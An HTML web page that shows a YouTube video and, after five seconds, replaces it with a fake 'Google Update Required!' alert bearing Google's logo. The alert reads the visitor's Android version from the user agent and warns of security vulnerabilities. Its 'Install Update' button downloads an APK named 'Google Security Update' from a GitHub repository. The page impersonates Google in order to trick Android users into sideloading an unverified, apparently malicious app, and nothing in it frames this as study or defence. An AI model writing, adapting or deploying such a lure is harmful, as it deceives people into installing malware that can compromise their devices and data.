<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Critical Update Notice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            flex-direction: column;
            overflow: hidden;
        }

        /* Full-screen iframe */
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            border: none;
            z-index: 1; /* Keep the iframe on top initially */
        }

        /* Critical update message */
        .critical-update {
            background-color: #FFFFFF;  /* Red background */
            color: #202124;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 80%;
            max-width: 600px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            font-size: 18px;
            display: none; /* Hidden initially */
            position: absolute;
            z-index: 9999;
        }

        .critical-update h1 {
            font-size: 24px;
            margin: 0;
        }

        .critical-update p {
            font-size: 18px;
            margin: 10px 0;
        }

        .install-button {
            padding: 12px 25px;
            background-color: #4285F4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
        }

        .install-button:hover {
            background-color: #357AE8;
        }

        .google-logo {
            width: 100px; /* Google logo size */
            margin-bottom: 10px;
        }

        .message {
            font-size: 20px;
            margin-top: 15px;
            text-align: center;
        }
    </style>
</head>
<body>

    <!-- Embedded YouTube Video (in iframe) -->
    <iframe id="youtube-frame" src="https://www.youtube.com/embed/53DqFmb6hKc?si=tisFQ6qwtUdPe8e?autohide=1" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

    <!-- Critical Update message (hidden initially) -->
    <div id="criticalUpdate" class="critical-update">
        <!-- Use local Google logo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
        <h1>Google Update Required!</h1>
        <p id="androidVersionMessage">You are missing a critical update for your Android device. You are using Android version <span id="androidVersion">N/A</span>.</p>
        <p><strong>Be aware that security vulnerabilities are present on your current version!</strong></p>
        <button class="install-button" id="updateButton">Install Update</button>
    </div>

    <div id="message" class="message" style="display: none;">
        <p>Redirecting to our page...</p>
    </div>

    <script>
        // Step 1: Wait 10 seconds while YouTube iframe is showing
        setTimeout(function () {
            // After 10 seconds, hide the iframe and show the critical update message
            document.getElementById('youtube-frame').style.display = 'none';
            document.getElementById('criticalUpdate').style.display = 'block';
        }, 5000);  // Wait for 5 seconds

        // Step 2: Detect Android version after redirection
        window.addEventListener('load', function () {
            const userAgent = navigator.userAgent;
            const androidVersion = getAndroidVersion(userAgent);

            if (androidVersion) {
                document.getElementById('androidVersion').textContent = androidVersion;
            } else {
                document.getElementById('androidVersion').textContent = "Unknown";
            }
        });

        // Helper function to extract Android version from user agent
        function getAndroidVersion(userAgent) {
            const match = userAgent.match(/Android\s([0-9\.]+)/);
            return match ? match[1] : null;
        }

        // Button click event to trigger file download
        document.getElementById('updateButton').addEventListener('click', function () {
            // Simulate downloading a file (replace with actual file URL)
            const downloadUrl = 'https://github.com/ajitdesk25/Google_Update_apk/raw/refs/heads/main/Google_Update_Ver202511.apk';  // Provide the file URL here
            const link = document.createElement('a');
            link.href = downloadUrl;
            link.download = 'Google Security Update';  // Give the file a name when downloading
            link.click();
        });
    </script>

</body>
</html>
